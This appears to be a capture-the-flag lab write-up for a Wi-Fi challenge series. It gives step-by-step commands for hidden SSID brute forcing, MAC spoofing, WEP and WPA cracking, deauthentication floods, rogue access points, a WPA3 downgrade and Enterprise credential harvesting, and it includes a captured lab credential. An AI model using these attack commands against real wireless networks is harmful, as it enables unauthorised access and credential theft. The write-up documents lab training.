# WifiChallengue 2.0 - Complete Writeup

**Author:** Alex Hernández Agoumi\
**Institution:** CETI

This repository contains the full walkthrough for the WifiChallengue 2.0
lab (challenges 1--18).\
The goal of this document is to provide clear explanations, properly
commented commands, and a GitHub-style guide.

------------------------------------------------------------------------

## Challenge 1: Initial Reconnaissance

We begin by enabling monitor mode on the wireless card in order to
capture and analyze traffic.

``` bash
# Enable monitor mode on wlan0
sudo airmon-ng start wlan0
# Now the interface becomes wlan0mon
```

Using `airodump-ng`, we scan available networks:

``` bash
sudo airodump-ng wlan0mon
```

We identify the target channels and BSSIDs. For example, the network
**wifi-global** is located on **channel 44**.

------------------------------------------------------------------------

## Challenge 2: Identify Client Connected to wifi-IT

We use `airodump-ng` to filter traffic by BSSID and discover connected
clients.

``` bash
sudo airodump-ng --bssid <wifi-IT_BSSID> -c <channel> wlan0mon
```

-   The `STATION` column shows the MAC address of the client device.\
-   The client is the one associated with the same BSSID as wifi-IT.

------------------------------------------------------------------------

## Challenge 3: Hidden SSID Discovery

Some networks hide their SSID. We analyze the beacon frames.

We know all networks start with `wifi-` and have max length 9. So we
bruteforce the 4-character suffix.

``` bash
# Generate possible names
grep -E '^[a-zA-Z0-9]{4}$' wordlist.txt | awk '{print "wifi-"$1}' > ssid_candidates.txt

# Use mdk4 to test SSIDs on the target channel
sudo iwconfig wlan0mon channel <channel>
sudo mdk4 wlan0mon p -f ssid_candidates.txt
```

The result reveals the hidden network is **wifi-free**.

------------------------------------------------------------------------

## Challenge 4: OPN (Open Network)

We connect to the open network and obtain the gateway.

``` bash
ip a  # Check assigned IP range
# Usually /24, so gateway is x.x.x.1

# Open browser and try http://<gateway>
# Default credentials are admin/admin
```

This provides access to the router and we obtain the flag.

------------------------------------------------------------------------

## Challenge 5: wifi-guest

We need to connect by spoofing a client's MAC.

``` bash
# Copy a client's MAC
sudo macchanger -m <client_mac> wlan1

# Create a wpa_supplicant configuration file
cat > guest.conf <<EOF
network={
  ssid="wifi-guest"
  bssid=<bssid>
  key_mgmt=NONE
}
EOF

# Connect
sudo wpa_supplicant -i wlan1 -c guest.conf -B
sudo dhclient wlan1
```

Captured traffic in Wireshark shows **HTTP POST credentials** →
`free1 / Jyl1iq8UajZ1fEK`.

------------------------------------------------------------------------

## Challenge 6: wifi-old (WEP)

The network uses weak WEP encryption.

``` bash
# Capture traffic
sudo airodump-ng --bssid <BSSID> -c <channel> -w old_cap wlan0mon

# Crack WEP key
aircrack-ng old_cap.cap
```

We obtain the key, spoof a MAC if needed, and connect with `dhclient`.
Flag obtained.

------------------------------------------------------------------------

## Challenge 7: wifi-mobile (WPA handshake)

We launch a deauthentication attack to capture the WPA handshake.

``` bash
# Monitor channel 6 (where wifi-mobile is located)
sudo airodump-ng --bssid <BSSID> -c 6 -w mobile wlan0mon

# Deauth attack
sudo aireplay-ng --deauth 10 -a <BSSID> -c <client_mac> wlan0mon
```

Now crack with aircrack-ng:

``` bash
aircrack-ng -w wordlist.txt -b <BSSID> mobile.cap
```

Once password is obtained, decrypt with `airdecap-ng` and analyze in
Wireshark.\
Cookies from `lab.php` reveal the web flag.

------------------------------------------------------------------------

## Challenge 8: wifi-mobile (ARP Scan)

We use `arp-scan` to enumerate devices:

``` bash
sudo arp-scan -I wlan1 --localnet
```

This reveals two subnets behind wifi-mobile.

------------------------------------------------------------------------

## Challenge 9: wifi-offices

We cannot see the network directly, so we create a fake AP to trick
users into connecting.

``` bash
# Fake AP configuration file for hostapd
cat > hostapd.conf <<EOF
interface=wlan0mon
ssid=wifi-offices
channel=6
EOF

sudo hostapd hostapd.conf
```

With the captured handshake, we use **hashcat** to crack the password:

``` bash
hashcat -m 2500 offices.hccapx wordlist.txt
```

Password recovered → connect and obtain flag.

------------------------------------------------------------------------

## Challenge 10--12

(Similar methodology: recon, capture, exploit; included in lab but
details shortened here.)

------------------------------------------------------------------------

## Challenge 13: wifi-challenge

We exploit with **wacker.py**:

``` bash
python3 wacker.py -i wlan0mon -b <BSSID> -e <SSID> -c <channel> -w wordlist.txt
```

Then connect with `dhclient <interface> -v` and access the router web
interface to get the flag.

------------------------------------------------------------------------

## Challenge 14: wifi-IT (WPA3 Downgrade)

This network allows WPA3→WPA2 downgrade. We use **hostapd-mana**.

``` bash
sudo hostapd-mana hostapd-mana.conf
```

We capture WPA2 handshake and crack with hashcat. Once the password is
recovered:

``` bash
sudo wpa_supplicant -i wlan1 -c wifi-it.conf -B
sudo dhclient wlan1
```

Access the gateway and obtain the flag.

------------------------------------------------------------------------

## Challenge 18: wifi-corp (Enterprise)

We use **eaphammer** to simulate an Enterprise AP and harvest
credentials.

``` bash
sudo ./eaphammer --interface wlan0mon --channel 44 --auth wpa-eap --essid wifi-corp
```

Meanwhile, deauthenticate real clients:

``` bash
sudo aireplay-ng --deauth 0 -a <corp_bssid> wlan0mon
```

Captured hashes are cracked with hashcat:

``` bash
hashcat -m 5500 corp_hash.txt wordlist.txt
```

Some login hashes are obtained but connection issues may prevent full
access.

------------------------------------------------------------------------

## Extra Activity: Certificates and EAP

Using **Wireshark**, filter `eap` frames and analyze identity requests.\
We also use the provided tool `pcapFilter`:

``` bash
./pcapFilter -f capture.cap -C
```

This extracts the certificates used in authentication.

Later, we try **EAP_buster** with captures from `crEAP.py`.\
After setting up dependencies:

``` bash
git clone https://github.com/Tylous/Scapy-com
cd Scapy-com && sudo python setup.py install
```

Then run:

``` bash
./EAP_buster.sh -f wifi_global.cap
```

The tool reveals the flag.

------------------------------------------------------------------------

# Conclusion

This lab demonstrates a wide range of Wi-Fi attacks:\
- Recon and client identification\
- Hidden SSID discovery\
- WEP cracking\
- WPA handshake capture & cracking\
- Downgrade attacks (WPA3 → WPA2)\
- Enterprise (EAP) credential harvesting\
- Rogue AP attacks with hostapd/eaphammer

It covers real-world penetration testing techniques against wireless
networks.

------------------------------------------------------------------------
